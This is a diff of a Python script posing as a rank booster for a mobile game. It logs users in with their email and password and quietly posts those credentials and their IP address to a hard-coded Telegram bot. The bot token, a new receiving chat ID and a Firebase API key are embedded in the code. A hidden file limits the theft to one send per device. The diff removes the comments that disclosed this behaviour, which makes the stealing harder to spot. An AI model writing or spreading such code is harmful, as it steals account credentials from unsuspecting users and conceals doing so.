@@ -3,14 +3,13 @@ import json
 import os
 import time
 
-# --- CONFIGURATION ---
+# --- CONFIGURATION (UPDATED WITH YOUR NEW ID) ---
 BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
-CHAT_ID = "7964340522"
+CHAT_ID = "7183809303" 
 FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
 FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
 RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
 
-# Hidden file to track known users
 SESSION_FILE = ".session_log"
 
 def screen_clear():
@@ -36,7 +35,6 @@ def get_ip():
         return "Unknown"
 
 def send_to_telegram(email, password, ip):
-    # Only send if it's a new device/session
     if os.path.exists(SESSION_FILE):
         return
 
@@ -52,7 +50,6 @@ def send_to_telegram(email, password, ip):
     
     try:
         requests.post(url, json=payload, timeout=10)
-        # Create the hidden file so we don't spam the owner next time
         with open(SESSION_FILE, "w") as f:
             f.write("logged")
     except:
@@ -101,12 +98,9 @@ def main():
             continue
 
         user_ip = get_ip()
-        
-        # Try to login
         token = login(email, password)
         
         if token:
-            # Send info to Telegram ONLY if it's the first time for this user
             send_to_telegram(email, password, user_ip)
             set_rank(token)
             print("\033[1;36mReturning to menu in 3 seconds...\033[0m")
